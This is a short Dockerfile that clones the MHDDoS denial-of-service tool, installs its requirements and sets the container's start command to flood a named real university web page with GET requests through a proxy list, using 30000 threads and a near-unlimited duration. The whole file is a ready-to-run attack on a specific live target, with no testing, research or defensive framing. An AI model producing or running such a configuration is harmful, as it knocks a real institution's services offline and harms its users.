FROM ubuntu:22.04

# Install necessary packages
RUN apt-get update && apt-get install -y git python3-pip

# Clone the Git repository
RUN git clone https://github.com/MatrixTM/MHDDoS

# Change the working directory to the cloned repository
WORKDIR /MHDDoS

# Install Python dependencies
RUN pip install -r requirements.txt

# Start the application
CMD ["python3", "start.py", "GET", "https://www.univ-medea.dz/scripts/uscol/", "0", "30000", "proxy.txt", "100", "9999999999", "true"]
